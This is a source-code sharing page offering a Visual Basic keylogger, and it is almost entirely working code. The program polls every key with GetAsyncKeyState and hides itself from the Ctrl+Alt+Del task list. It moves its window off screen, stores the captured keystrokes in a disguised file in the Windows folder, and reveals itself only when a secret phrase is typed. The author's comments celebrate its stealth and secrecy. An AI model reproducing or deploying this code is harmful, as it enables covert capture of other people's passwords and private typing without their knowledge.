<div align="center">

## GOOD KEYLOGGER \- Update


</div>

### Description

As I Was Looking Around Your Site For Some New ideas, i saw, quote: "THE BEST KEYLOGGER ON PLANET-SOURCE-CODE". I Checked it out, and Here's Mine... Have a Go With It. Remember if you like my code PLEASE vote highly for it!
 
### More Info
 
form (form1), 2 command buttons (command1, caption: HIDE) (command2, caption: END), a textbox (text1, multiline:true), and a module (module1)

a SLIGHT proccesor usage increase, not noticable in a p2 or greater


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Jeff Katz](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/jeff-katz.md)
**Level**          |Intermediate
**User Rating**    |4.7 (14 globes from 3 users)
**Compatibility**  |VB 5\.0, VB 6\.0
**Category**       |[Miscellaneous](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/miscellaneous__1-1.md)
**World**          |[Visual Basic](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/visual-basic.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/jeff-katz-good-keylogger-update__1-5023/archive/master.zip)

### API Declarations

```
' copy into module
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long ' get this process
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long ' and then un-register it!
Public Const RSP_SIMPLE_SERVICE = 1
Public Const RSP_UNREGISTER_SERVICE = 0 'seems odd, the way these are named
Public Sub HIDECAD()
 Dim pid As Long
 Dim reserv As Long
 pid = GetCurrentProcessId()
 regserv = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
End Sub
Public Sub SHOWCAD()
 Dim pid As Long
 Dim reserv As Long
 pid = GetCurrentProcessId()
 regserv = RegisterServiceProcess(pid, RSP_UNREGISTER_SERVICE)
End Sub
```


### Source Code

```
Dim Shift As Boolean
Dim shiftc As Boolean
Private KeyResult As Long ' no real need for this, just gives you that warm fuzzy feeling
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer ' get the current state of the keys
Private Sub Command1_Click()
HIDECAD ' hide program in ctrl+alt+del , even more cloaking
Form1.Top = Screen.Height + 100 ' put the form off screen, undetectable
Do While Form1.Top = Screen.Height + 100 ' new code to catch evry keystroke
' note: while this code catches every keystroke, it also DOES NOT catch any while the form is maximized
erre:
shiftc = True
For i = 1 To 300
KeyResult = GetAsyncKeyState(i)
On Error GoTo erre
If KeyResult = -32767 Then
Select Case i
Case Is = 8
Text1.Text = Text1.Text & " BKSP "
Case Is = 16
Shift = True ' CHANGES TEXT TO UPPER CASE
Text1.Text = Text1.Text & " SHIFT "
Case Is = 112 ' FUNCTION KEYS
Text1.Text = Text1.Text & " F1 "
Case Is = 113
Text1.Text = Text1.Text & " F2 "
Case Is = 114
Text1.Text = Text1.Text & " F3 "
Case Is = 115
Text1.Text = Text1.Text & " F4 "
Case Is = 116
Text1.Text = Text1.Text & " F5 "
Case Is = 117
Text1.Text = Text1.Text & " F6 "
Case Is = 118
Text1.Text = Text1.Text & " F7 "
Case Is = 119
Text1.Text = Text1.Text & " F8 "
Case Is = 120
Text1.Text = Text1.Text & " F9 "
Case Is = 121
Text1.Text = Text1.Text & " F10 "
Case Is = 122
Text1.Text = Text1.Text & " F11 "
Case Is = 123
Text1.Text = Text1.Text & " F12 "
Case Is = 32
Text1.Text = Text1.Text & " SPACE "
Case Is = 13
Text1.Text = Text1.Text & " ENTER "
Case Is = 27
Text1.Text = Text1.Text & " ESC "
Case Is = 46
Text1.Text = Text1.Text & " DEL "
Case Is = 18
Text1.Text = Text1.Text & " ALT "
Case Is = 17
Text1.Text = Text1.Text & " CTRL "
Case Is = 91
Text1.Text = Text1.Text & " WINKEY "
Case Is = 32
Text1.Text = Text1.Text & " SPACE "
Case Is = 9
Text1.Text = Text1.Text & " TAB "
' Next four are Arrow Keys
Case Is = 37
Text1.Text = Text1.Text & " <- "
Case Is = 38
Text1.Text = Text1.Text & " ^ "
Case Is = 39
Text1.Text = Text1.Text & " -> "
Case Is = 40
Text1.Text = Text1.Text & " \/ "
Case 65 To 90 ' letters, note the use of lcase to use when without shift!
If Shift Then
Text1.Text = Text1.Text & UCase(Chr(i))
Shift = False ' resets shift!
Else ' have to make lower cause of some darn vb thing
Text1.Text = Text1.Text & LCase(Chr(i))
End If
Case 48 To 57 ' numbers , also /w shift does char such as !@#$%^&*()
If Shift = False Then
Text1.Text = Text1.Text & Chr(i)
Else ' if shift is down, do funky symbols
If i = 48 Then Text1.Text = Text1.Text & ")"
If i = 49 Then Text1.Text = Text1.Text & "!"
If i = 50 Then Text1.Text = Text1.Text & "@"
If i = 51 Then Text1.Text = Text1.Text & "#"
If i = 52 Then Text1.Text = Text1.Text & "$"
If i = 53 Then Text1.Text = Text1.Text & "%"
If i = 54 Then Text1.Text = Text1.Text & "^"
If i = 55 Then Text1.Text = Text1.Text & "&"
If i = 56 Then Text1.Text = Text1.Text & "*"
If i = 57 Then Text1.Text = Text1.Text & "("
Shift = False ' resets shift!
End If
Case Is = 1
' can anybody tell me what this does? seems to happen evry btn click!
Case Is = 190 ' from here down is the new update, includes most of the other keys on the keyboard... enjoy!
If Shift Then ' note: 2 keys cannot be mapped in vb : Printscrn/sysrq and Pause/Break
Text1.Text = Text1.Text & ">"
Shift = False
else
Text1.Text = Text1.Text & "."
End If
Case Is = 188
If Shift Then
Text1.Text = Text1.Text & "<"
Shift = False
else
Text1.Text = Text1.Text & ","
End If
Case Is = 191
If Shift Then
Text1.Text = Text1.Text & "?"
Shift = False
else
Text1.Text = Text1.Text & "/"
End If
Case Is = 222
If Shift Then
Text1.Text = Text1.Text & """"
Shift = False
else
Text1.Text = Text1.Text & "'"
End If
Case Is = 192
If Shift Then
Text1.Text = Text1.Text & "~"
Shift = False
else
Text1.Text = Text1.Text & "`"
End If
Case Is = 186
If Shift Then
Text1.Text = Text1.Text & ":"
Shift = False
else
Text1.Text = Text1.Text & ";"
End If
Case Is = 219
If Shift Then
Text1.Text = Text1.Text & "{"
Shift = False
else
Text1.Text = Text1.Text & "["
End If
Case Is = 220
If Shift Then
Text1.Text = Text1.Text & "|"
Shift = False
else
Text1.Text = Text1.Text & "\"
End If
Case Is = 221
If Shift Then
Text1.Text = Text1.Text & "}"
Shift = False
else
Text1.Text = Text1.Text & "]"
End If
Case Is = 93
Text1.Text = Text1.Text & " WINPROP "
Case Is = 45
Text1.Text = Text1.Text & " INSERT TOGGLE "
Case Is = 36
Text1.Text = Text1.Text & " HOME "
Case Is = 33
Text1.Text = Text1.Text & " PGUP "
Case Is = 34
Text1.Text = Text1.Text & " PGDN "
Case Is = 35
Text1.Text = Text1.Text & " END "
Case Is = 144
Text1.Text = Text1.Text & " NUMLOCK TOGGLE "
Case Is = 145
Text1.Text = Text1.Text & " SCROLL LOCK TOGGLE "
Case Is = 189
If Shift Then
Text1.Text = Text1.Text & "_"
Shift = False
else
Text1.Text = Text1.Text & "-"
End If
Case Is = 188
If Shift Then
Text1.Text = Text1.Text & "+"
Shift = False
else
Text1.Text = Text1.Text & "="
End If
' and now for the new KEYPAD btns
Case 96 To 105 'numbers, 0-9 respectively
If i = 96 Then Text1.Text = Text1.Text & " NUM0 "
If i = 97 Then Text1.Text = Text1.Text & " NUM1 "
If i = 98 Then Text1.Text = Text1.Text & " NUM2 "
If i = 99 Then Text1.Text = Text1.Text & " NUM3 "
If i = 100 Then Text1.Text = Text1.Text & " NUM4 "
If i = 101 Then Text1.Text = Text1.Text & " NUM5 "
If i = 102 Then Text1.Text = Text1.Text & " NUM6 "
If i = 103 Then Text1.Text = Text1.Text & " NUM7 "
If i = 104 Then Text1.Text = Text1.Text & " NUM8 "
If i = 105 Then Text1.Text = Text1.Text & " NUM9 "
Case Is = 110
Text1.Text = Text1.Text & " NUM. "
Case Is = 111
Text1.Text = Text1.Text & " NUM/ "
Case Is = 107
Text1.Text = Text1.Text & " NUM+ "
Case Is = 109
Text1.Text = Text1.Text & " NUM- "
Case Is = 106
Text1.Text = Text1.Text & " NUM* "
Case Is = 20 ' CAPSLOCK key
Text1.Text = Text1.Text & " CAPS TOGGLE "
Case Else
Rem MsgBox i
'remmed out for secrecy!
End Select
End If
Next
Loop
End Sub
Private Sub Command2_Click()
End ' exit program
End Sub
Private Sub text1_Change()
If Right(Text1.Text, 10) = "opensaysme" Then ' if user types secret access code
Text1.Text = (Left(Text1.Text, Len(Text1.Text) - 10)) ' remove bad access code from list
SHOWCAD ' show in ctrl + alt + del
Form1.Top = (Screen.Height / 2) + (Form1.Height / 2) ' put in middle of screen
End If
'now, to save to the logfile
On Error GoTo erre 'in case of non exist, create
Open "c:\windows\keylog.ini" For Input As #1
Input #1, a ' get old logfile
Close #1
Open "c:\windows\keylog.ini" For Output As #1
Print #1, a  ' Take Old Data
Print #1, Text1.Text ' And Append New Data
Close #1
Exit Sub ' unless error has occoured, exit sub, we're done
erre: ' error has occoured
Open "c:\windows\keylog.ini" For Output As #1
Print #1, Text1.Text ' Start New Logfile
Close #1
End Sub
```

